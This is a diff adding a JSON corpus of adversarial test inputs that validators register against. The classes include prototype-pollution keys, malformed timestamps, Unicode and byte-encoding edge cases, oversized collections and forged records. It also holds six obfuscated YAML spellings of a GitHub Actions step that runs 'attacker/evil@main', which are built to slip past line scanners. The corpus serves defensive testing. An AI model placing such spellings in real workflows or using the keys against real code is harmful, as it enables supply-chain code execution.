@@ -1,0 +1,53 @@
+{
+  "schema": "aos-attack-corpus.v1",
+  "comment": "Input classes that each cost a review round the first time a human thought of them. A parser or validator registers against the classes that apply to it, and the battery runs every case in each registered class. Adding a case here strengthens every registered surface at once.",
+  "classes": {
+    "prototype-keys": {
+      "why": "a plain object inherits the __proto__ setter, so an attacker-chosen key wrote through to Object.prototype and vanished from Object.keys — a modified workspace diffed as untouched",
+      "cases": ["__proto__", "constructor", "prototype", "hasOwnProperty", "toString"]
+    },
+    "impossible-instants": {
+      "why": "Date.parse accepts \"0\", rolls 2026-02-30 into March, and maps years 0-99 into the 1900s; each of these passed some earlier validator",
+      "cases": [
+        "2026-99-99T99:99:99+99:99", "2026-02-30T00:00:00Z", "2026-02-29T00:00:00Z",
+        "0000-00-00T00:00:00Z", "2026-01-01T12:34:60Z", "2026-01-01T23:59:60Z",
+        "1990-12-31T23:59:61Z", "0", "yesterday", "1900-02-29T00:00:00Z"
+      ],
+      "valid_cases": ["2026-09-01T23:45:51.074Z", "2026-09-01T23:45:51+09:00", "0000-02-29T00:00:00Z", "2024-02-29T00:00:00Z", "2026-09-02t00:00:00z"]
+    },
+    "astral-strings": {
+      "why": "a regex without the u flag and a .length check both count UTF-16 code units, so one emoji was two characters long and matched ^..$",
+      "cases": ["\ud83d\ude00", "e\u0301", "\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67", "A\ud83d\ude00B"]
+    },
+    "byte-identity": {
+      "why": "a digest over decoded text called two different files the same: UTF-16 vs UTF-8, BOM or no BOM, CRLF vs LF, and any invalid byte folded to U+FFFD",
+      "cases_base64": {
+        "utf8_ab": "YQpi", "utf8_crlf_ab": "YQ0KYg==", "utf8_bom_ab": "77u/YQpi",
+        "utf16le_ab": "//5hAAoAYgA=", "invalid_ff": "/w==", "invalid_fe": "/g==", "replacement_char": "77+9"
+      }
+    },
+    "yaml-spellings": {
+      "why": "every one of these is a real key GitHub honours and a line scanner missed: quoted, escaped, folded, flow, anchored, merged",
+      "cases": [
+        "- \"uses\": attacker/evil@main",
+        "- \"\\u0075ses\": attacker/evil@main",
+        "- uses:\n    attacker/evil@main",
+        "- { uses: attacker/evil@main }",
+        "- &pwn { uses: attacker/evil@main }",
+        "? >-\n  uses\n: attacker/evil@main"
+      ]
+    },
+    "unbounded-collections": {
+      "why": "a canonical-sized document carried a hundred thousand references because nothing said it could not, and the checks below it became unbounded work",
+      "generator": { "array_of_ints": [100001], "ring_nodes": [12000], "duplicate_entries": [2] }
+    },
+    "forged-records": {
+      "why": "schema-shaped objects whose every field is well-formed and whose content is fabricated: a one-key verified:true, a record for a different subject, separately-true-but-unrelated facts",
+      "cases": [
+        { "shape": "one-key-summary", "value": { "verified": true } },
+        { "shape": "wrong-subject", "value": { "schema": "expected", "issue": 999 } },
+        { "shape": "empty-evidence", "value": { "evidence": {} } }
+      ]
+    }
+  }
+}
